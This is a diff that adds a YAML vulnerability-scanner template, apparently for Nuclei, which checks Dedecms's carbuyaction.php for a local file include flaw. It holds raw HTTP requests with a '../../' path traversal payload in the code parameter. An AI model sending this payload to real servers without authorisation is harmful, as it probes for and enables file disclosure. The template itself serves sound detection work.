@@ -1,0 +1,33 @@
+id: dedecms-carbuyaction-fileinclude
+info:
+  name: Dedecms Carbuyaction File Include Vulnerability
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: lfi
+  description: |
+    Dedecms Carbuyaction is vulnerable to a file include issue, allowing attackers to access sensitive files.
+http:
+  - raw:
+      - |
+        GET /plus/carbuyaction.php?dopost=return&code=../../ HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: code=alipay
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        GET /plus/carbuyaction.php?dopost=return&code=../../ HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: code=cod
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Cod::respond()"
+        part: body
